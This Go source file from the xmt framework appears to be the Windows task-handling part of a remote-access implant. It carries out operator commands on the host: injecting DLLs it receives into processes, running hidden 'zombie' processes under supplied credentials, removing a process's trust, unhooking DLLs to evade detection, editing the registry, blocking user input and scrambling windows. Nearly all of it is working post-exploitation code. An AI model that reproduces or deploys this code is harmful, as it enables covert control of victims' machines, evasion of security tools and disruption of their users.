//go:build windows

package task

import (
	"bytes"
	"context"
	"io"
	"os"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/evade"
	"github.com/iDigitalFlame/xmt/device/regedit"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/device/winapi/registry"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

func randMod(v int32) int32 {
	n := int32(util.FastRandN(256))
	if util.FastRandN(2) == 0 {
		return n + v
	}
	return v - n
}
func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
	t, err := r.Uint8()
	if err != nil {
		return err
	}
	switch t {
	case taskTrollHcEnable, taskTrollHcDisable:
		return winapi.SetHighContrast(t == taskTrollHcEnable)
	case taskTrollSwapEnable, taskTrollSwapDisable:
		return winapi.SwapMouseButtons(t == taskTrollSwapEnable)
	case taskTrollBlockInputEnable, taskTrollBlockInputDisable:
		return winapi.BlockInput(t == taskTrollBlockInputEnable)
	case taskTrollWallpaperPath:
		var s string
		if err = r.ReadString(&s); err != nil {
			return err
		}
		return winapi.SetWallpaper(s)
	case taskTrollWallpaper:
		var f *os.File
		if f, err = os.CreateTemp("", execD); err != nil {
			return err
		}
		_, err = io.Copy(f, r)
		if f.Close(); err != nil {
			os.Remove(f.Name())
			return err
		}
		return winapi.SetWallpaper(f.Name())
	case taskTrollWTF:
		var d time.Duration
		if err = r.ReadInt64((*int64)(&d)); err != nil {
			return err
		}
		if d <= 0 {
			return nil
		}
		var (
			z = time.NewTimer(d)
			v = time.NewTicker(time.Millisecond * time.Duration(250+util.FastRandN(250)))
		)
	loop:
		for {
			select {
			case <-v.C:
				e, err := winapi.TopLevelWindows()
				if err != nil {
					break
				}
				switch h := e[util.FastRandN(len(e))]; util.FastRandN(3) {
				case 0:
					winapi.ShowWindow(h.Handle, uint8(1+util.FastRandN(12)))
				case 1:
					winapi.SetWindowTransparency(h.Handle, uint8(util.FastRandN(256)))
				case 2:
					winapi.SetWindowPos(h.Handle, randMod(h.X), randMod(h.Y), randMod(h.Width), randMod(h.Height))
				}
			case <-z.C:
				break loop
			case <-x.Done():
				break loop
			}
		}
		v.Stop()
		z.Stop()
		return winapi.SetWindowTransparency(0, 255)
	}
	return xerr.Sub("invalid type", 0xD)
}
func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	o, err := evade.CheckDLL(s)
	if err != nil {
		return err
	}
	return w.WriteBool(o)
}
func taskReload(_ context.Context, r data.Reader, _ data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	return evade.ReloadDLL(s)
}
func taskInject(x context.Context, r data.Reader, w data.Writer) error {
	d, z, v, err := DLLUnmarshal(x, r)
	if err != nil {
		return err
	}
	if err = d.Start(); err != nil {
		if v {
			os.Remove(d.Path)
		}
		return err
	}
	h, _ := d.Handle()
	if w.WriteUint64(uint64(h)); !z {
		if w.WriteUint64(uint64(d.Pid()) << 32); v {
			go func() {
				if bugtrack.Enabled {
					defer bugtrack.Recover("task.taskInject.func1()")
				}
				d.Wait()
				os.Remove(d.Path)
			}()
		} else {
			d.Release()
		}
		return nil
	}
	w.WriteUint32(d.Pid())
	if err = d.Wait(); v {
		os.Remove(d.Path)
	}
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	c, _ := d.ExitCode()
	w.WriteInt32(c)
	return nil
}
func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
	z, f, err := ZombieUnmarshal(x, r)
	if err != nil {
		return err
	}
	if f {
		w.WriteUint64(0)
		z.Stdout, z.Stderr = w, w
	}
	if err = z.Start(); err != nil {
		z.Stdout, z.Stderr = nil, nil
		return err
	}
	if z.Stdin = nil; !f {
		w.WriteUint64(uint64(z.Pid()) << 32)
		z.Release()
		return nil
	}
	i := z.Pid()
	err, z.Stdout, z.Stderr = z.Wait(), nil, nil
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = z.ExitCode()
		s    = w.(backer)
		//     ^ This should NEVER panic!
	)
	s.WriteUint32Pos(0, i)
	s.WriteUint32Pos(4, uint32(c))
	return nil
}
func taskRename(_ context.Context, _ data.Reader, _ data.Writer) error {
	return device.ErrNoNix
}
func taskUntrust(_ context.Context, r data.Reader, _ data.Writer) error {
	var f filter.Filter
	if err := f.UnmarshalStream(r); err != nil {
		return err
	}
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	p, err := f.SelectFunc(nil)
	if err != nil {
		return err
	}
	return winapi.Untrust(p)
}
func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
	var (
		o   uint8
		k   string
		err = r.ReadUint8(&o)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&k); err != nil {
		return err
	}
	if o > regOpSetStringList {
		return registry.ErrUnexpectedType
	}
	if len(k) == 0 {
		return xerr.Sub("empty key name", 0x37)
	}
	switch w.WriteUint8(o); o {
	case regOpLs:
		e, err1 := regedit.Dir(k)
		if err1 != nil {
			return err1
		}
		w.WriteUint32(uint32(len(e)))
		for i := range e {
			if err = e[i].MarshalStream(w); err != nil {
				return err
			}
		}
		return nil
	case regOpMake:
		return regedit.MakeKey(k)
	case regOpDeleteKey:
		f, err1 := r.Bool()
		if err1 != nil {
			return err1
		}
		return regedit.DeleteKey(k, f)
	}
	v, err := r.StringVal()
	if err != nil {
		return err
	}
	if len(v) == 0 {
		return xerr.Sub("empty value name", 0x38)
	}
	switch o {
	case regOpGet:
		x, err1 := regedit.Get(k, v)
		if err1 != nil {
			return err1
		}
		x.MarshalStream(w)
	case regOpSet:
		t, err1 := r.Uint32()
		if err1 != nil {
			return err1
		}
		b, err1 := r.Bytes()
		if err1 != nil {
			return err1
		}
		regedit.Set(k, v, t, b)
	case regOpDelete:
		f, err1 := r.Bool()
		if err1 != nil {
			return err1
		}
		return regedit.DeleteEx(k, v, f)
	case regOpSetDword:
		d, err1 := r.Uint32()
		if err1 != nil {
			return err1
		}
		return regedit.SetDword(k, v, d)
	case regOpSetQword:
		d, err1 := r.Uint64()
		if err1 != nil {
			return err1
		}
		return regedit.SetQword(k, v, d)
	case regOpSetBytes:
		b, err1 := r.Bytes()
		if err1 != nil {
			return err1
		}
		return regedit.SetBytes(k, v, b)
	case regOpSetString:
		s, err1 := r.StringVal()
		if err1 != nil {
			return err1
		}
		return regedit.SetString(k, v, s)
	case regOpSetStringList:
		var l []string
		if err = data.ReadStringList(r, &l); err != nil {
			return err
		}
		return regedit.SetStrings(k, v, l)
	case regOpSetExpandString:
		s, err1 := r.StringVal()
		if err1 != nil {
			return err1
		}
		return regedit.SetExpandString(k, v, s)
	}
	return registry.ErrUnexpectedType
}
func taskInteract(_ context.Context, r data.Reader, _ data.Writer) error {
	t, err := r.Uint8()
	if err != nil {
		return err
	}
	var h uint64
	if err = r.ReadUint64(&h); err != nil {
		return err
	}
	switch t {
	case taskWindowTransparency:
		var v uint8
		if err = r.ReadUint8(&v); err != nil {
			return err
		}
		return winapi.SetWindowTransparency(uintptr(h), v)
	case taskWindowEnable, taskWindowDisable:
		_, err = winapi.EnableWindow(uintptr(h), t == taskWindowEnable)
		return err
	case taskWindowShow:
		var v uint8
		if err = r.ReadUint8(&v); err != nil {
			return err
		}
		_, err = winapi.ShowWindow(uintptr(h), v)
		return err
	case taskWindowClose:
		return winapi.CloseWindow(uintptr(h))
	case taskWindowMessage:
		var (
			t, d string
			f    uint32
		)
		if err = r.ReadUint32(&f); err != nil {
			return err
		}
		if err = r.ReadString(&t); err != nil {
			return err
		}
		if err = r.ReadString(&d); err != nil {
			return err
		}
		_, err = winapi.MessageBox(uintptr(h), d, t, f)
		return err
	case taskWindowMove:
		var x, y, w, v int32
		if err = r.ReadInt32(&x); err != nil {
			return err
		}
		if err = r.ReadInt32(&y); err != nil {
			return err
		}
		if err = r.ReadInt32(&w); err != nil {
			return err
		}
		if err = r.ReadInt32(&v); err != nil {
			return err
		}
		return winapi.SetWindowPos(uintptr(h), x, y, w, v)
	case taskWindowFocus:
		return winapi.SetForegroundWindow(uintptr(h))
	case taskWindowType:
		var t string
		if err = r.ReadString(&t); err != nil {
			return err
		}
		return winapi.SendInput(uintptr(h), t)
	}
	return xerr.Sub("invalid type", 0xD)
}
func taskWindowList(_ context.Context, _ data.Reader, w data.Writer) error {
	e, err := winapi.TopLevelWindows()
	if err != nil {
		return err
	}
	if err = w.WriteUint32(uint32(len(e))); err != nil {
		return err
	}
	if len(e) == 0 {
		return nil
	}
	for i, m := uint32(0), uint32(len(e)); i < m; i++ {
		if err = e[i].MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}

// DLLUnmarshal will read this DLL's struct data from the supplied reader and
// returns a DLL runnable struct along with the wait and delete status booleans.
//
// This function returns an error if building or reading fails or if the device
// is not running Windows.
func DLLUnmarshal(x context.Context, r data.Reader) (*cmd.DLL, bool, bool, error) {
	var d DLL
	if err := d.UnmarshalStream(r); err != nil {
		return nil, false, false, err
	}
	if len(d.Data) == 0 && len(d.Path) == 0 {
		return nil, false, false, cmd.ErrEmptyCommand
	}
	p := d.Path
	if len(d.Data) > 0 {
		f, err := os.CreateTemp("", execB)
		if err != nil {
			return nil, false, false, err
		}
		_, err = f.Write(d.Data)
		if f.Close(); err != nil {
			os.Remove(f.Name())
			return nil, false, false, err
		}
		p = f.Name()
	}
	v := cmd.NewDllContext(x, p)
	v.Timeout = d.Timeout
	v.SetParent(d.Filter)
	return v, d.Wait, d.Path != p, nil
}

// ZombieUnmarshal will read this Zombies's struct data from the supplied reader
// and returns a Zombie runnable struct along with the wait status boolean.
//
// This function returns an error if building or reading fails or if the device
// is not running Windows.
func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, error) {
	var z Zombie
	if err := z.UnmarshalStream(r); err != nil {
		return nil, false, err
	}
	if len(z.Args) == 0 || len(z.Data) == 0 {
		return nil, false, cmd.ErrEmptyCommand
	}
	v := cmd.NewZombieContext(x, nil, z.Args...)
	if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'S' && z.Args[0][5] == 'L' {
		v.Args = []string{device.Shell, device.ShellArgs, strings.Join(z.Args[1:], " ")}
	} else if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'P' && z.Args[0][5] == 'L' {
		v.Args = append([]string{device.PowerShell}, z.Args[1:]...)
	}
	if v.SetFlags(z.Flags); z.Hide {
		v.SetNoWindow(true)
		v.SetWindowDisplay(0)
	}
	if v.SetParent(z.Filter); len(z.Stdin) > 0 {
		v.Stdin = bytes.NewReader(z.Stdin)
	}
	if v.Timeout, v.Dir, v.Env, v.Data = z.Timeout, z.Dir, z.Env, z.Data; len(z.User) > 0 {
		v.SetLogin(z.User, z.Domain, z.Pass)
	}
	return v, z.Wait, nil
}
